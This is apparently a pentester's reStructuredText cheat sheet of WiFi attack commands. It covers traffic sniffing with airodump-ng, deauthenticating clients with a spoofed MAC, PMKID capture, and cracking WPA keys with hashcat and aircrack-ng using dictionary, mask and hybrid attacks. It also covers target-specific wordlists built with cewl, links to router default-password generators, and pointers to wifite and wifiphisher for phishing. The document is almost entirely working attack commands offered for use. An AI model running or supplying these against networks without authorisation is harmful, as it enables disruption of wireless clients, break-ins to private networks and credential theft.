####
Wifi
####

Sniffing
=========

.. code-block:: bash

  airmon-ng start wlp2s0
  airodump-ng -a -c <channel> --essid <ssid> -w mydump wlp2s0mon
  airodump-ng -a -c <channel> --bssid <ap_mac> -w mydump wlp2s0mon

Deauth attack
=============

.. code-block:: bash

  aireplay-ng --deauth 1 -a <ap_mac> -c <client_mac> -h <spoof_src_mac> wlp2s0mon

PMKID attack
============

.. code-block:: bash

  hcxdumptool -o mydump.pcap -i wlp2s0 --enable_status=3
  hcxpcaptool -z test.16800 mydump.pcap

Cracking
========

* hashcat and dictionary attack

.. code-block:: bash

  hcxpcapngtool ~/balle.pcap-01.cap -o test.16800
  hashcat -m 22000 -w 3 test.16800 mydict.txt

* Bruteforce attack

.. code-block:: bash

  hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'

* Hybrid wordlist and bruteforce

.. code-block:: bash

  hashcat -m 22000 -w 3 -a 7 -o cracked.txt test.16800 '?d?d?d?d?s' mydict.txt

* Or using aircrack

.. code-block:: bash

  aircrack-ng -w rockyou.txt mydump.pcap

* For possible default password generators
** https://hashcat.net/forum/thread-6170.html
** https://deadcode.me/blog/2016/07/01/UPC-UBEE-EVW3226-WPA2-Reversing.html

* And to generate a wordlist depending on a homepage

.. code-block:: bash

  cewl -d 4 -m 8 <url> -w wordlist.txt


Automated security check
========================

* wifite is your friend
* but manual checks are still better ;)


Man in the middle
=================

* Use wifiphisher
